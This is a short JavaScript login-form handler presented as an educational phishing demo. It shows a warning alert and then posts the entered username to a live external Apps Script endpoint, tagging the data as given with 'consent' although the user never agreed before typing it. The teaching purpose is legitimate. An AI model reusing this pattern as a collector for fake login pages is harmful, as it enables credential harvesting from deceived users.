document.getElementById("loginForm").addEventListener("submit", async function(e){
  e.preventDefault();

  const username = document.getElementById("username").value;

  // Show the demo alert (educational)
  alert(
    "Educational Demo\n\nHello " + username +
    "\n\nThis demonstrates how phishing pages may ask for credentials.\nAlways verify the website URL before logging in."
  );

  // SAFE: only send non-sensitive demo data and include an explicit consent flag.
  // Do NOT send passwords or other sensitive credentials.
  try {
    await fetch("https://script.google.com/macros/s/AKfycbzrtqFC4SEh2lTUDjPFV4KPUupKBEgibFwTxma3tnxTCn1RvSw6UGieapMmpl-Btqw5Eg/exec", {
      method: "POST",
      headers: {
        "Content-Type": "application/json"
      },
      body: JSON.stringify({
        username: username,
        demo: true,
        consent: "user_shown_and_informed" // include evidence of consent in the payload
      })
    });
  } catch (err) {
    // handle error (optional)
    console.error("Failed to send demo data:", err);
  }

  this.reset();
});
